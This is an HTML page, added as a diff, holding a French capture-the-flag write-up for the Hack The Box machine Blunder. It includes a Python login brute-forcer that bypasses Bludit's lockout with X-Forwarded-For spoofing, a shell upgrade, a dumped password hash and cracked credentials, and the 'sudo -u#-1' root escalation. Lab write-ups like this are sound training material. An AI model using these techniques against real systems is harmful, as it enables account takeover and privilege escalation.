@@ -1,0 +1,369 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>htb blunder</title>
+	<link href="https://jurassi.ch/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed for blog posts" />
+	<style>
+		body {
+			font-family: sans-serif;
+			margin: 0 auto;
+			max-width: 48rem;
+			line-height: 1.45;
+			padding: 0.5rem 0 1.6rem;
+			#box-shadow: 0 0 2rem 0 #bbb;
+			#border-radius: 0 0 0.6rem 0.6rem;
+		}
+		main {
+			padding: 0 1.4rem;
+			hyphens: auto;
+		}
+		code {
+			background: #eee;
+			padding: 0.3rem;
+			tab-size: 4;
+		}
+		pre code {
+			display: block;
+			overflow-x: auto;
+			padding: 0.3rem 0.6rem;
+		}
+
+		nav ul {
+			margin: 0;
+			padding: 0;
+			display: flex;
+			background: #a11;
+		}
+		nav li {
+			list-style: none;
+		}
+		nav li * {
+			display: block;
+			padding: 0.4rem 0.4rem;
+			color: white;
+		}
+		nav li strong {
+			padding-left: 1.5rem;
+			padding-right: 1rem;
+		}
+		nav a {
+			text-decoration: none;
+		}
+		nav a:hover {
+			background: #ad4949;
+		}
+	</style>
+</head>
+
+<nav>
+	<ul>
+		<li><strong>Jurassi.ch</strong></li>
+		<li><a href="index.html">/home</a></li>
+		<li><a href="about.html">about</a></li>
+		<li><a href="links.html">links</a></li>
+	</ul>
+</nav>
+
+<main>
+<h1>htb blunder</h1>
+<p>Voici mes notes pour Blunder.</p>
+<h4>Reco</h4>
+<pre><code>kali@kali:~$ nmap 10.10.10.191
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 01:58 EDT
+Nmap scan report for 10.10.10.191
+Host is up (0.064s latency).
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE
+21/tcp closed ftp
+80/tcp open   http
+</code></pre>
+<h4>Enumération web</h4>
+<pre><code>kali@kali:~$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.191
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Timeout:        10s
+===============================================================
+2020/06/05 02:30:45 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/.hta (Status: 403)
+/0 (Status: 200)
+/LICENSE (Status: 200)
+/about (Status: 200)
+/admin (Status: 301)
+/cgi-bin/ (Status: 301)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/06/05 02:31:24 Finished
+===============================================================
+
+</code></pre>
+<pre><code>kali@kali:~$ curl  http://10.10.10.191/admin/ | html2text
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2385  100  2385    0     0  15690      0 --:--:-- --:--:-- --:--:-- 15794
+
+****** BLUDIT ******
+[username            ]
+[********************]
+⁰ Remember me
+Login
+
+</code></pre>
+<p>On découvre une application Bludit en version 3.9.2 selon la source HTML de la page.</p>
+<pre><code>kali@kali:~$ curl  http://10.10.10.191/admin/ 
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+        &lt;title&gt;Bludit&lt;/title&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;
+        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+        &lt;meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;&gt;
+
+        &lt;!-- Favicon --&gt;
+        &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;/bl-kernel/img/favicon.png?version=3.9.2&quot;&gt;
+
+        &lt;!-- CSS --&gt;
+        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2&quot;&gt;
+</code></pre>
+<p><img src="/assets/img/image-20200605083719998.png" alt="image-20200605083719998" /></p>
+<p>Il existe une faiblesse de protection contre le bruteforce. POC ici : https://rastating.github.io/bludit-brute-force-mitigation-bypass/</p>
+<h4>POC</h4>
+<pre><code>#!/usr/bin/env python3
+import re
+import requests
+
+host = 'http://10.10.10.191'
+login_url = host + '/admin/login'
+username = 'admin'
+
+# My modification
+# wordlist = []
+
+filename = &quot;/usr/share/wordlists/rockyou.txt&quot;
+with open(filename) as file:
+    content = file.readlines()
+    word1 = [x.strip() for x in content] 
+wordlist = word1
+
+# Generate 50 incorrect passwords
+# for i in range(50):
+#    wordlist.append('Password{i}'.format(i = i))
+
+# Add the correct password to the end of the list
+# wordlist.append('adminadmin')
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;', login_page.text).group(1)
+
+    print('[*] Trying: {p}'.format(p = password))
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print()
+            print('SUCCESS: Password found!')
+            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print()
+            break
+</code></pre>
+<p><img src="/assets/img/image-20200605091855280.png" alt="image-20200605091855280" /></p>
+<p>Ma tentative de bruteforce échoue. Je continue mes énumérations.</p>
+<pre><code>kali@kali:~$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux -x .txt,.php,.bak,.old
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.191
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Extensions:     txt,php,bak,old
+[+] Timeout:        10s
+===============================================================
+2020/06/05 05:32:24 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.bak (Status: 403)
+/.htaccess.old (Status: 403)
+/.hta (Status: 403)
+/.hta.txt (Status: 403)
+/.hta.php (Status: 403)
+/.hta.bak (Status: 403)
+/.hta.old (Status: 403)
+/0 (Status: 200)
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.bak (Status: 403)
+/.htpasswd.old (Status: 403)
+/LICENSE (Status: 200)
+/about (Status: 200)
+/admin (Status: 301)
+/robots.txt (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+/todo.txt (Status: 200)
+</code></pre>
+<p>Je découvre un fichier todo.txt.</p>
+<pre><code>-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+</code></pre>
+<ul>
+<li>Update n'a pas été faite - en effet ;-)</li>
+<li>Faut-il se connecter en tant que fergus ?</li>
+<li>L'ancien blog est-il accessible ?</li>
+<li>Etablissons une liste de mot de passe à partir du contenu du site.</li>
+</ul>
+<pre><code>cewl -w mycustomwordlist.txt -d 10 -m 4 http://10.10.10.191
+</code></pre>
+<p>Je lance mon script bruteforce en utilisant cette fois le user <em>fergus</em>, et la wordlist mycustomwordlist.txt que je viens de créer.</p>
+<p><img src="/assets/img/image-20200605114735174.png" alt="image-20200605114735174" /></p>
+<p>Bingo</p>
+<pre><code>Use fergus:RolandDeschain to login.
+</code></pre>
+<p>Encore un fan de Stephen King !</p>
+<p>Il existe un module metasploit pour obtenir un reverse shell via Bludit.</p>
+<p><img src="/assets/img/image-20200605121910806.png" alt="image-20200605121910806" /></p>
+<p>Je configure le module.</p>
+<p><img src="/assets/img/image-20200605121843002.png" alt="image-20200605121843002" /></p>
+<p>Et pour obtenir un shell utilisable :</p>
+<pre><code>python -c &quot;import pty;pty.spawn('/bin/sh')&quot;
+</code></pre>
+<p><img src="image-20200605125757335.png" alt="image-20200605125757335" /></p>
+<p>Un peu de reconnaissance locale.</p>
+<pre><code>$ uname -a
+uname -a
+Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+$ cat /etc/issue
+cat /etc/issue
+Ubuntu 19.10 \n \l
+
+$ ls /home
+ls /home
+hugo  shaun
+</code></pre>
+<p>Le flag n'est pas accessible, seul Hugo peut le lire.</p>
+<pre><code>$ ls -als /home/hugo/*
+/home/hugo:
+total 80
+...
+4 -r--------  1 hugo hugo   33 Jun  5 08:32 user.txt
+</code></pre>
+<p>Je m'aperçois qu'il y a deux sites sans doute ancien et nouveau site comme c'était évoqué dans la todo.txt list.</p>
+<pre><code>$ pwd
+/var/www/bludit-3.9.2/bl-content/tmp
+
+$ ls -l
+ls -l
+total 12
+drwxr-xr-x 8 www-data www-data 4096 May 19 15:13 bludit-3.10.0a
+drwxrwxr-x 8 www-data www-data 4096 Apr 28 12:18 bludit-3.9.2
+drwxr-xr-x 2 root     root     4096 Nov 28  2019 html
+</code></pre>
+<p>Voyons le contenu de users.php du nouveau site. Un compte Hugo et son empreinte de mot de passe !</p>
+<pre><code>$ pwd          
+pwd
+/var/www/bludit-3.10.0a/bl-content/databases
+$ cat users.php
+cat users.php
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    &quot;admin&quot;: {
+        &quot;nickname&quot;: &quot;Hugo&quot;,
+        &quot;firstName&quot;: &quot;Hugo&quot;,
+        &quot;lastName&quot;: &quot;&quot;,
+        &quot;role&quot;: &quot;User&quot;,
+        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
+        &quot;email&quot;: &quot;&quot;,
+        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
+        &quot;tokenRemember&quot;: &quot;&quot;,
+        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
+        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
+        &quot;twitter&quot;: &quot;&quot;,
+        &quot;facebook&quot;: &quot;&quot;,
+        &quot;instagram&quot;: &quot;&quot;,
+        &quot;codepen&quot;: &quot;&quot;,
+        &quot;linkedin&quot;: &quot;&quot;,
+        &quot;github&quot;: &quot;&quot;,
+        &quot;gitlab&quot;: &quot;&quot;}
+}
+</code></pre>
+<p>Le hash est-il connu de crackstation.net ? Oui !</p>
+<p><img src="/assets/img/image-20200605133203267.png" alt="image-20200605133203267" /></p>
+<p>Le mot de passe aurait-il été réutilisé pour le compte unix ? C'est le cas !</p>
+<pre><code>$ su - hugo
+su - hugo
+Password: Password120
+
+hugo@blunder:~$ cat user.txt
+cat user.txt
+fbbd480ffe63207917bf7f19b9dcf347
+</code></pre>
+<p>A quelles commandes avons-nous accès avec sudo ?</p>
+<pre><code>hugo@blunder:~$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+</code></pre>
+<p>Si on google ceci <code>(ALL, !root) /bin/bash</code>, on découvre des explications sur une vulnérabilité sudo (CVE-2019-18634) https://www.exploit-db.com/exploits/47502. Il s'agit de contourner les restriction du fichier sudoers.</p>
+<p>Vulnérabilité jusqu'à la version 1.8.27 et nous sommes en 1.8.25p1.</p>
+<p><img src="/assets/img/image-20200605141506589.png" alt="image-20200605141506589" /></p>
+<p>Le contournement de la restriction du fichier sudoers :</p>
+<pre><code>hugo@blunder:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# whoami
+whoami
+root
+root@blunder:/home/hugo# id
+id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
+root@blunder:/home/hugo# 
+</code></pre>
+<p><img src="/assets/img/image-20200605134534606.png" alt="image-20200605134534606" /></p>
+<pre><code>root@blunder:/root# cat root.txt
+cat root.txt
+2a5148892d8ae104a26698ae3e94bb3e
+</code></pre>
+<small>Written on 2023-09-11.</small>
+</main>
